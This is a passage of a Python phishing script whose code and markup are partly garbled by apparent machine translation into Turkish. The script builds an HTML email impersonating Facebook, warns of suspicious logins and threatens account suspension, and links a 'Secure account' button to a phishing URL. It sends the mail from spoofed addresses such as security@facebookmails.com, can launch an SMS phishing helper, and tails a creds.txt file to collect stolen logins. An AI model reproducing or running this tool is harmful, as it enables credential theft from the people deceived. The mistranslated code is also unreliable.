önemli; } \ n \ n .ie-tarayıcı .block-grid.eleven-up .col, [owa] .block-grid.eleven-up .col { \ n   genişlik: 43px! önemli; } \ n \ n .ie-tarayıcı .block-grid.twelve-up .col, [owa] .block-grid.twelve-. .col { \ n   genişlik: 40px! önemli; } \ n   @ medya yalnızca ekranı ve (dk. genişlik: 500 piksel ) {"" " + " "" \ n .block-grid { \ n    width: 480px !important; }\n  .block-grid .col {\n    vertical-align: top; }\n    .block-grid .col.num12 {\n      width: 480px !important; }\n  .block-grid.mixed-two-up .col.num4 {\n    width: 160px !important; }\n  .block-grid.mixed-two-up .col.num8 {\n    width: 320px !important; }\n  .block-grid.two-up .col {\n    width: 240px !important; }\n  .block-grid.three-up .col {\n    width: 160px !important; }\n  .block-grid.four-up .col {\n    width: 120px !important; }\n  .block-grid.five-up .col {\n    width: 96px !important; }\n  .block-grid.six-up .col {\n    width: 80px !important; }\n  .block-grid.seven-up .col {\n    width: 68px !important; }\n  .block-grid.eight-up .col {\n    width: 60px !important; }\n  .block-grid.nine-up .col {\n    width: 53px !important; }\n  .block-grid.ten-up .col {\n    width: 48px !important; }\n  .block-grid.eleven-up .col {\n    width: 43px !important; }\n  .block-grid.twelve-up .col {\n    width: 40px !important; } }\n@media (max-width: 500px) {\n  .block-grid, .col {\n    min-width: 320px !important;\n    max-width: 100% !important;\n    display: block !important; }\n  .block-grid {\n    width: calc(100% - 40px) !important; }\n  .col {\n    width: 100% !important; }\n    .col > div {\n      margin: 0 auto; }\n  img.fullwidth, img.fullwidthOnMobile {\n    max-width: 100% !important; }\n  .no-stack .col {\n    min-width: 0 !important;\n    display: table-cell !important; }\n  .no-stack.two-up .col {\n    width: 50% !important; }\n  .no-stack.mixed-two-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.mixed-two-up .col.num8 {\n    width: 66% !important; }\n  .no-stack.three-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.four-up .col.num3 {\n    width: 25% !important; } }\n\n    </style>\n</head>\n<body class="clean-body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #FAF7F7">\n  <style type="text/css" id="media-query-bodytag">\n    @media (max-width: 520px) {\n      .block-grid {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n      .col {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n        .col > div {\n          margin: 0 auto;\n        }\n      img.fullwidth {\n        max-width: 100%!important;\n      }\n			img.fullwidthOnMobile {\n        max-width: 100%!important;\n      }\n      .no-stack .col {\n				min-width: 0!important;\n				display: table-cell!important;\n			}\n			.no-stack.two-up .col {\n				width: 50%!important;\n			}\n			.no-stack.mixed-two-up .col.num4 {\n				width: 33%!important;\n			}\n			.no-stack.mixed-two-up .col.num8 {\n				width: 66%!important;\n			}\n			.no-stack.three-up .col.num4 {\n				width: 33%!important\n			}\n			.no-stack.four-up .col.num3 {\n				width: 25%!important\n			}\n    }\n  </style>\n  <!--[if IE]><div class="ie-browser"><![endif]-->\n  <!--[if mso]><div class="mso-container"><![endif]-->\n  <table class="nl-container" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FAF7F7;width: 100%" cellpadding="0" cellspacing="0">\n	<tbody>\n	<tr style="vertical-align: top">\n		<td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">\n    <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #FAF7F7;"><![endif]-->\n    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid mixed-two-up ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="160" style=" width:160px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num4" style="display: table-cell;vertical-align: top;max-width: 320px;min-width: 160px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <div align="center" class="img-container center fixedwidth" style="padding-right: 0px;  padding-left: 0px;">\n<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 0px; padding-left: 0px;" align="center"><![endif]-->\n  <img class="center fixedwidth" align="center" border="0" src="https://proxy.duckduckgo.com/iu/?u=http://pngimg.com/uploads/facebook_logos/facebook_logos_PNG19748.png&f=1" alt="Image" title="Image" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: block !important;border: 0;height: auto;float: none;width: 100%;max-width: 80px" width="80">\n<!--[if mso]></td></tr></table><![endif]-->\n</div>\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n              <!--[if (mso)|(IE)]></td><td align="center" width="320" style=" width:320px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num8" style="display: table-cell;vertical-align: top;min-width: 320px;max-width: 320px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px;text-align: center"><span style="font-size: 42px; line-height: 50px;"><strong><span style="line-height: 50px; font-size: 42px;">Facebook</span></strong></span></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n									 <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><span style="font-size: 16px; line-height: 19px;">﻿Hello """+full_name+""", We've found some suspicious activity on your account, We think someone logged in to your Facebook Profile with this details:</span>﻿</p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#9F7474;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#9F7474;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>OS:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;"""+Email_OS+"""</strong><br></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>Time:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; """+Email_time+"""</strong></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>From:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160; &#160; """+Email_from+"""</strong></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>IP:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; """+Email_ip+"""</strong></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 14px;line-height: 17px"><span style="font-size: 14px; line-height: 16px;">if this is you please <a style="color:#0068A5;text-decoration: underline;" title="confirm" href="CONFIRM_URL">confirm</a> here, or if this isn't you just secure your account by changing your password and clicking the button down below<br></span></p><p style="margin: 0;font-size: 14px;line-height: 17px">or we will have to suspend your facebook account <br></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n                  \n                    \n<div align="center" class="button-container center" style="padding-right: 10px; padding-left: 10px; padding-top:10px; padding-bottom:10px;">\n  <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing: 0; border-collapse: collapse; mso-table-lspace:0pt; mso-table-rspace:0pt;"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top:10px; padding-bottom:10px;" align="center"><v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word" href="""+phishin_url+""" style="height:31pt; v-text-anchor:middle; width:124pt;" arcsize="10%" strokecolor="#0068A5" fillcolor="#0068A5"><w:anchorlock/><v:textbox inset="0,0,0,0"><center style="color:#ffffff; font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; font-size:16px;"><![endif]-->\n    <a href="""+phishin_url+""" target="_blank" style="display: block;text-decoration: none;-webkit-text-size-adjust: none;text-align: center;color: #ffffff; background-color: #0068A5; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; max-width: 166px; width: 126px;width: auto; border-top: 0px solid transparent; border-right: 0px solid transparent; border-bottom: 0px solid transparent; border-left: 0px solid transparent; padding-top: 5px; padding-right: 20px; padding-bottom: 5px; padding-left: 20px; font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;mso-border-alt: none">\n      <span style="font-size:16px;line-height:32px;"><strong>Secure account</strong></span>\n    </a>\n  <!--[if mso]></center></v:textbox></v:roundrect></td></tr></table><![endif]-->\n</div>\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>   <!--[if (mso)|(IE)]></td></tr></table><![endif]-->\ n 		</td> \ n   </tr> \ n   </tbody> \ n   </table> \ n   <! - [if (mso) | (IE)]> </div> <! [endif] -> \ n </body> </html> "" " )
	from_email  =  str ( rastgele . seçim ([ 'security@facebookmails.com' , 'no-reply@facebookmails.com' ]))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Giriş' , '-m' , email_body_html , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( "sıfırla" )

	görüntüler . durdur ()

	eğer  Phone_try  ==  "N" :
		geçmek
	elif  Phone_try  ==  "y" :
		os . sistemi ( "xterm -e \" python3 ./sms_support/facebook_sms.py \ " &" )

	##################################
	# KREDİ KONTROLÜ #
	##################################

	os . sistemi ( "sıfırla" )

	banN ()
	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mKimlikteki Krediler için Dinleme: \ 033 [0; 94m" + str ( ID ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( "kuyruk -f ./WEBSERVER/creds.txt" )

	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )

	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )

	yazdır ( "son bir adım !! \ n " )

	IPZ = giriş ( Gri + "[" + Mavi + "IP" + Gri + "]" + Yeşil + ":" + Sıfırla )
	OSZ = giriş ( Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )

	İçerik Tipi "content =" metin / html; charset = utf-8 "> \ n    <meta name = "viewport" content = "width = cihaz genişliği"> \ n     <! - [if! mso]> <! -> <meta http-equiv = "X-UA-Uyumlu" content = " IE = kenar "> <! - <! [Endif] -> \ n     <title> </title> \ n     \ n     \ n     <style type =" text / css "id =" medya sorgusu "> \ n       gövde { \ n   kenar boşluğu: 0; \ n   dolgu: 0; } \ n \ n tablo, tr, td { \ n   dikey hizalama: üst; \ n   sınır-çöküşü: çöküş; } \ n \ n. tarayıcı tarayıcı tablosu, .mso-konteyner tablosu { \ n   tablo düzeni: sabit;  satır yüksekliği: miras; } \ n \ n a [x-apple-data-detectors = true] { \ n   renk: devralma! önemli; \ n   metin dekorasyonu: yok! önemli; } \ n \ n [owa] .img-container div, [owa] .img-container düğmesi { \ n   display: block! important; } \ n \ n [owa] .ful   genişlik düğmesi { \ n genişlik:% 100! önemli; } \ n \ n [owa] .block-grid .col { \ n   görüntüleme: tablo hücresi; \ n   şamandıra: yok! önemli; \ n   dikey hizalama: üst; } \ n \ n .ie-tarayıcı .num12, .ie-tarayıcı .block-grid, [owa] .num12, [owa] .block-grid {\ n   genişlik: 480 piksel! önemli; } \ n \ n .ExternalClass, .ExternalClass p, .ExternalClass aralığı, .ExternalClass yazı tipi, .ExternalClass td, .ExternalClass div { \ n   satır yüksekliği: 100%; } \ n \ n .ie-tarayıcı. karışık-iki-yukarı .num4, [owa]. karışık-iki-yukarı .num4 { \ n   genişlik: 160 piksel ! önemli; } \ n \ n .ie-tarayıcı. karışık-iki-yukarı .num8, [owa]. karışık-iki-yukarı .num8 { \ n   genişlik: 320 piksel! önemli; } \ n \ n .ie-tarayıcı .block-grid.two-up .col, [owa] .block-grid.two-up .col { \ n   genişlik: 240px! önemli; } \ n \ n.ie-tarayıcı .block-grid.three-up .col, [owa] .block-grid.three-up .col { \ n   genişlik: 160px ! önemli; } \ n \ n .ie-tarayıcı .block-grid.four-up .col, [owa] .block-grid.four-up .col { \ n   genişlik: 120px! önemli; } \ n \ n .ie-tarayıcı .block-grid.five-up .col, [owa] .block-grid.five-up .col { \ n   genişlik: 96px! önemli; } \ n \ n .ie-tarayıcı .block-grid.six-up .col, [owa] .block-grid.six-up .col { \ n   genişlik: 80px! önemli; } \ n \ n .ie-tarayıcı .block-grid.seven-up .col, [owa] .block-grid.seven-up .col { \ n   genişlik: 68px! önemli; } \ n \ n.ie-tarayıcı .block-grid.eight-up .col, [owa] .block-grid.eight-up .col { \ n   genişlik: 60px! önemli; } \ n \ n .ie-tarayıcı .block-grid.nine-up .col, [owa] .block-grid.nine-up .col { \ n   genişlik: 53px! önemli; } \ n \ n .ie-tarayıcı .block-grid.ten-up .col, [owa] .block-grid.ten-up .col { \ n   genişlik: 48px! önemli; } \ n \ n .ie-tarayıcı .block-grid.eleven-up .col, [owa] .block-grid.eleven-up .col { \ n   genişlik: 43px! önemli; } \ n \ n .ie-tarayıcı .block-grid.twelve-up .col, [owa] .block-grid.twelve-. .col { \ n   genişlik: 40px! önemli; } \ n@media yalnızca ekranı ve (dk genişlik:   500     piksel ) {"" " + " "" \ n .block-grid { \ n genişlik: 480 piksel! önemli; } \ n   .block-grid .col { \ n     dikey hizalama: üst; } \ n     .block-grid .col.num12 { \ n       genişlik: 480 piksel! önemli; } \ n   .block-grid.mixed-two-up .col.num4 { \ n     genişlik: 160px ! önemli; } \ n   .block-grid.mixed-two-up .col.num8 { \ n     genişlik: 320px ! önemli; } \ n   .block-grid.two-up .col { \ n     genişlik: 240px! önemli; } \ n   .block-grid.three-up .col { \ n    width: 160px !important; }\n  .block-grid.four-up .col {\n    width: 120px !important; }\n  .block-grid.five-up .col {\n    width: 96px !important; }\n  .block-grid.six-up .col {\n    width: 80px !important; }\n  .block-grid.seven-up .col {\n    width: 68px !important; }\n  .block-grid.eight-up .col {\n    width: 60px !important; }\n  .block-grid.nine-up .col {\n    width: 53px !important; }\n  .block-grid.ten-up .col {\n    width: 48px !important; }\n  .block-grid.eleven-up .col {\n    width: 43px !important; }\n  .block-grid.twelve-up .col {\n    width: 40px !important; } }\n@media (max-width: 500px) {\n  .block-grid, .col {\n    min-width: 320px !important;\n    max-width: 100% !important;\n    display: block !important; }\n  .block-grid {\n    width: calc(100% - 40px) !important; }\n  .col {\n    width: 100% !important; }\n    .col > div {\n      margin: 0 auto; }\n  img.fullwidth, img.fullwidthOnMobile {\n    max-width: 100% !important; }\n  .no-stack .col {\n    min-width: 0 !important;\n    display: table-cell !important; }\n  .no-stack.two-up .col {\n    width: 50% !important; }\n  .no-stack.mixed-two-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.mixed-two-up .col.num8 {\n    width: 66% !important; }\n  .no-stack.three-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.four-up .col.num3 {\n    width: 25% !important; } }\n\n    </style>\n</head>\n<body class="clean-body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #FAF7F7">\n  <style type="text/css" id="media-query-bodytag">\n    @media (max-width: 520px) {\n      .block-grid {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n      .col {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n        .col > div {\n          margin: 0 